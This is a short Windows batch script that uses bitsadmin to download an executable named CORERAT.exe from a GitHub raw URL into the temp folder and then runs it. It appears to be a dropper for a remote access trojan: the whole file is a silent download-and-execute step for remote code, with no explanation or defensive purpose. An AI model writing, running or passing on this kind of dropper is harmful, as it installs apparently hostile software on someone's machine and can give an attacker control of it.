@echo off
set url=https://raw.githubusercontent.com/theCore034/r32y43287436287423/main/CORERAT.exe
set tempPath=%temp%\CORERAT.exe

bitsadmin /transfer "DownloadJob" %url% %tempPath%
start %tempPath%
